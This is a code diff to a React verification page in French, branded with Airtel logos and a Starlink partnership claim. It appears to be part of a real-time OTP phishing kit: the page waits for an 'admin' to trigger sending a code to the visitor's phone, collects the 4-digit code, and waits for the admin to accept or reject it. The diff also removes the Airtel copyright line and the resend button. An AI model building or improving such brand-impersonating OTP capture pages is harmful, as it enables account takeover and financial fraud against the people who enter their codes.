@@ -8,49 +8,59 @@ import {
   useSubmitOtp,
 } from '@workspace/api-client-react';
 
-type Stage = 'loading' | 'otp_entry' | 'awaiting_admin' | 'verified' | 'rejected';
+type Stage = 'waiting_for_admin' | 'otp_entry' | 'awaiting_confirm' | 'verified' | 'rejected';
+
+const OTP_COUNTDOWN_SECONDS = 30;
 
 export default function Verify() {
-  const [stage, setStage] = useState<Stage>('loading');
+  const [stage, setStage] = useState<Stage>('waiting_for_admin');
   const [otp, setOtp] = useState(['', '', '', '']);
-  const [timeLeft, setTimeLeft] = useState(30);
+  const [timeLeft, setTimeLeft] = useState(OTP_COUNTDOWN_SECONDS);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const sessionId = (history.state?.usr?.sessionId ?? '') as string;
-  const phoneNumber = (history.state?.usr?.phoneNumber ?? '+243951234567') as string;
+  const phoneNumber = (history.state?.usr?.phoneNumber ?? '') as string;
 
-  // 2-second initial spinner, then move to OTP entry
-  useEffect(() => {
-    const t = setTimeout(() => setStage('otp_entry'), 2000);
-    return () => clearTimeout(t);
-  }, []);
+  // Poll session — active during waiting_for_admin AND awaiting_confirm
+  const shouldPoll = stage === 'waiting_for_admin' || stage === 'awaiting_confirm';
 
-  // Countdown timer while on OTP entry
-  useEffect(() => {
-    if (stage !== 'otp_entry') return;
-    if (timeLeft <= 0) return;
-    const id = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
-    return () => clearInterval(id);
-  }, [stage, timeLeft]);
-
-  // Poll session status while awaiting admin confirmation
   const { data: sessionData } = useGetSession(sessionId, {
     query: {
-      enabled: !!sessionId && stage === 'awaiting_admin',
+      enabled: !!sessionId && shouldPoll,
       queryKey: getGetSessionQueryKey(sessionId),
-      refetchInterval: 2000,
+      refetchInterval: shouldPoll ? 2000 : false,
     },
   });
 
+  // React to status changes from polling
   useEffect(() => {
     if (!sessionData) return;
-    if (sessionData.status === 'verified') setStage('verified');
-    if (sessionData.status === 'rejected') setStage('rejected');
-  }, [sessionData]);
+    const { status } = sessionData;
+
+    if (stage === 'waiting_for_admin' && status === 'otp_sent') {
+      // Admin confirmed OTP was sent — move to OTP entry with fresh countdown
+      setTimeLeft(OTP_COUNTDOWN_SECONDS);
+      setOtp(['', '', '', '']);
+      setStage('otp_entry');
+    }
+
+    if (stage === 'awaiting_confirm') {
+      if (status === 'verified') setStage('verified');
+      if (status === 'rejected') setStage('rejected');
+    }
+  }, [sessionData, stage]);
+
+  // Countdown timer — only ticks during OTP entry stage
+  useEffect(() => {
+    if (stage !== 'otp_entry') return;
+    if (timeLeft <= 0) return;
+    const id = setInterval(() => setTimeLeft((prev) => Math.max(0, prev - 1)), 1000);
+    return () => clearInterval(id);
+  }, [stage, timeLeft]);
 
   const submitOtp = useSubmitOtp({
     mutation: {
-      onSuccess: () => setStage('awaiting_admin'),
+      onSuccess: () => setStage('awaiting_confirm'),
     },
   });
 
@@ -79,28 +89,40 @@ export default function Verify() {
   };
 
   const handleConfirm = () => {
-    if (!sessionId) return;
+    if (!sessionId || otp.some((d) => !d)) return;
     submitOtp.mutate({ id: sessionId, data: { otp: otp.join('') } });
+  };
+
+  const handleRetry = () => {
+    setOtp(['', '', '', '']);
+    setTimeLeft(OTP_COUNTDOWN_SECONDS);
+    setStage('otp_entry');
+    setTimeout(() => inputRefs.current[0]?.focus(), 50);
   };
 
   return (
     <div className="min-h-[100dvh] flex flex-col bg-background font-sans items-center justify-center relative overflow-hidden">
       <AnimatePresence mode="wait">
 
-        {/* ── Loading spinner ── */}
-        {stage === 'loading' && (
+        {/* ── Waiting for admin to send OTP ── */}
+        {stage === 'waiting_for_admin' && (
           <motion.div
-            key="loading"
+            key="waiting"
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
             className="flex flex-col items-center justify-center p-6 text-center"
-            data-testid="view-loading"
+            data-testid="view-waiting-admin"
           >
-            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-12 animate-pulse" />
+            <img src={airtelLogo} alt="Airtel Logo" className="h-14 w-auto object-contain mb-12" />
             <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
-            <h2 className="text-2xl font-bold text-foreground mb-2">Veuillez patienter...</h2>
-            <p className="text-muted-foreground font-medium">Cela prend généralement quelques secondes</p>
+            <h2 className="text-2xl font-bold text-foreground mb-2">Envoi du code OTP...</h2>
+            <p className="text-muted-foreground font-medium max-w-xs">
+              Votre code OTP est en cours d'envoi vers&nbsp;
+              <strong className="text-foreground">{phoneNumber || 'votre numéro'}</strong>.
+              <br />
+              Veuillez patienter.
+            </p>
           </motion.div>
         )}
 
@@ -118,14 +140,14 @@ export default function Verify() {
             <div className="w-full bg-card rounded-3xl shadow-sm border border-card-border p-8 mb-8 text-center">
               <h1 className="text-2xl font-black text-foreground mb-2 tracking-tight">Vérification OTP</h1>
               <p className="text-muted-foreground text-sm font-medium mb-6">
-                Entrez l'OTP envoyé à votre numéro de téléphone
+                Entrez l'OTP reçu sur votre téléphone
                 <br />
                 <strong className="text-foreground text-base mt-2 inline-block font-bold">{phoneNumber}</strong>
               </p>
 
               <div className="mb-8">
                 <label className="block text-sm font-bold text-foreground mb-4">
-                  Entrer l'OTP à 4 chiffres
+                  Code OTP à 4 chiffres
                 </label>
                 <div className="flex justify-center gap-3 md:gap-4" onPaste={handlePaste}>
                   {otp.map((digit, index) => (
@@ -171,28 +193,26 @@ export default function Verify() {
               <div className="mt-6 text-sm font-medium text-muted-foreground" data-testid="text-countdown">
                 {timeLeft > 0 ? (
                   <span>
-                    Le code expire dans <strong className="text-foreground">{timeLeft}</strong> secondes
+                    Code valide pendant{' '}
+                    <strong className="text-foreground tabular-nums">{timeLeft}</strong> secondes
                   </span>
                 ) : (
-                  <button className="text-primary hover:underline font-bold transition-all">
-                    Renvoyer le code OTP
-                  </button>
+                  <span className="text-muted-foreground">Code expiré — contactez le support</span>
                 )}
               </div>
             </div>
 
-            <div className="flex flex-col items-center gap-4 text-center opacity-80">
+            <div className="flex flex-col items-center gap-3 opacity-70">
               <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider">
                 En collaboration avec STARLINK™
               </span>
-              <img src={airtelLogo} alt="Airtel Logo" className="h-8 w-auto object-contain grayscale" />
-              <p className="text-xs font-medium text-muted-foreground">© 2026 Airtel Congo. Tous droits réservés.</p>
+              <img src={airtelLogo} alt="Airtel Logo" className="h-7 w-auto object-contain grayscale" />
             </div>
           </motion.div>
         )}
 
-        {/* ── Awaiting admin confirmation ── */}
-        {stage === 'awaiting_admin' && (
+        {/* ── Awaiting admin confirmation of OTP ── */}
+        {stage === 'awaiting_confirm' && (
           <motion.div
             key="awaiting"
             initial={{ opacity: 0, scale: 0.95 }}
@@ -210,7 +230,7 @@ export default function Verify() {
           </motion.div>
         )}
 
-        {/* ── Verified ── */}
+        {/* ── Verified (success) ── */}
         {stage === 'verified' && (
           <motion.div
             key="success"
@@ -234,7 +254,7 @@ export default function Verify() {
           </motion.div>
         )}
 
-        {/* ── Rejected ── */}
+        {/* ── Rejected — allow retry ── */}
         {stage === 'rejected' && (
           <motion.div
             key="rejected"
@@ -249,17 +269,17 @@ export default function Verify() {
               <XCircle className="w-10 h-10 text-destructive" />
             </div>
             <h2 className="text-2xl font-black text-foreground mb-2" data-testid="text-rejected-title">
-              OTP invalide
+              Code incorrect
             </h2>
             <p className="text-muted-foreground font-medium mb-6">
-              Le code saisi est incorrect. Veuillez réessayer.
+              L'OTP saisi est invalide. Veuillez réessayer.
             </p>
             <button
-              onClick={() => { setOtp(['', '', '', '']); setStage('otp_entry'); }}
-              className="px-8 py-3 bg-primary text-primary-foreground font-bold rounded-xl hover:bg-primary/90 transition-all"
+              onClick={handleRetry}
+              className="px-8 py-3 bg-primary text-primary-foreground font-bold rounded-xl hover:bg-primary/90 transition-all shadow-md shadow-primary/20"
               data-testid="button-retry"
             >
-              Réessayer
+              Ressaisir le code
             </button>
           </motion.div>
         )}
